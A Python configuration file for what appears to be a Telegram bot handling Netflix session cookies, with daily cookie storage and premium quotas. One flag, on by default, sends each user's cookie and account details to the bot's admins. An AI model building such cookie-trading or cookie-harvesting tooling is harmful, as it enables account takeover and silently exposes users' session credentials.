import logging
import os
from pathlib import Path


def _load_env_file(env_path: Path) -> None:
    """Load local .env values without overriding real environment variables."""
    if not env_path.exists():
        return

    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue

            key, value = stripped.split("=", 1)
            key = key.strip()
            value = value.strip()
            if not key or key in os.environ:
                continue

            if (value.startswith('"') and value.endswith('"')) or (
                value.startswith("'") and value.endswith("'")
            ):
                value = value[1:-1]

            os.environ[key] = value
    except OSError as exc:
        logging.getLogger(__name__).warning("Could not load .env file %s: %s", env_path, exc)


_load_env_file(Path(__file__).with_name(".env"))

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=os.getenv("LOG_LEVEL", "INFO").upper(),
)

logger = logging.getLogger(__name__)


def _parse_admin_ids(raw_value: str) -> list[int]:
    admin_ids: list[int] = []
    for part in raw_value.split(","):
        part = part.strip()
        if not part:
            continue
        try:
            admin_ids.append(int(part))
        except ValueError:
            logger.warning("Ignoring invalid ADMIN_IDS value: %s", part)
    return admin_ids


BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_IDS = _parse_admin_ids(os.getenv("ADMIN_IDS", "1325407917"))
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "Sais_tool").strip().lstrip("@")
CHANNEL_URL = os.getenv("CHANNEL_URL", f"https://t.me/{CHANNEL_USERNAME}")

TELEGRAM_CONNECT_TIMEOUT = float(os.getenv("TELEGRAM_CONNECT_TIMEOUT", "30"))
TELEGRAM_READ_TIMEOUT = float(os.getenv("TELEGRAM_READ_TIMEOUT", "30"))
TELEGRAM_WRITE_TIMEOUT = float(os.getenv("TELEGRAM_WRITE_TIMEOUT", "30"))
TELEGRAM_POOL_TIMEOUT = float(os.getenv("TELEGRAM_POOL_TIMEOUT", "30"))
TELEGRAM_BOOTSTRAP_RETRIES = int(os.getenv("TELEGRAM_BOOTSTRAP_RETRIES", "0"))
TELEGRAM_PROXY_URL = os.getenv("TELEGRAM_PROXY_URL", "").strip()

USER_DAILY_LIMIT = int(os.getenv("USER_DAILY_LIMIT", "15"))
USER_FILE_DAILY_LIMIT = int(os.getenv("USER_FILE_DAILY_LIMIT", "3"))
PREMIUM_DAILY_LIMIT = int(os.getenv("PREMIUM_DAILY_LIMIT", "100000"))
PREMIUM_FILE_DAILY_LIMIT = int(os.getenv("PREMIUM_FILE_DAILY_LIMIT", "500"))

# Increased concurrency for faster processing
MAX_CONCURRENT_PROCESSING = int(os.getenv("MAX_CONCURRENT_PROCESSING", "20"))
CACHE_TTL = int(os.getenv("CACHE_TTL_SECONDS", "1800"))
COOKIE_CACHE: dict[str, tuple[float, dict]] = {}

DATA_DIR = Path(os.getenv("DATA_DIR") or os.getenv("RAILWAY_VOLUME_DIR") or os.getcwd())
try:
    DATA_DIR.mkdir(parents=True, exist_ok=True)
except OSError as exc:
    logger.error("Could not create data directory %s: %s", DATA_DIR, exc)
DB_FILE = DATA_DIR / "netflix_bot.db"
BACKUP_DIR = DATA_DIR / "backups"

# Daily cookies storage (no DB)
DAILY_COOKIES_DIR = DATA_DIR / "daily_cookies"
try:
    DAILY_COOKIES_DIR.mkdir(parents=True, exist_ok=True)
except OSError as exc:
    logger.error("Could not create daily cookies directory %s: %s", DAILY_COOKIES_DIR, exc)

MAX_UPLOAD_BYTES = int(os.getenv("MAX_UPLOAD_BYTES", str(15 * 1024 * 1024)))
MAX_ARCHIVE_FILES = int(os.getenv("MAX_ARCHIVE_FILES", "25"))
MAX_ARCHIVE_ENTRY_BYTES = int(os.getenv("MAX_ARCHIVE_ENTRY_BYTES", str(5 * 1024 * 1024)))
MAX_ARCHIVE_TOTAL_UNCOMPRESSED_BYTES = int(
    os.getenv("MAX_ARCHIVE_TOTAL_UNCOMPRESSED_BYTES", str(10 * 1024 * 1024))
)

# NEW: Control whether admins receive the user's cookie and detailed account info
SEND_COOKIE_TO_ADMIN = os.getenv("SEND_COOKIE_TO_ADMIN", "true").lower() in ("true", "1", "yes")
logger.info("Send cookies to admin: %s", SEND_COOKIE_TO_ADMIN)

logger.info("Using data directory: %s", DATA_DIR)
logger.info("Database file: %s", DB_FILE)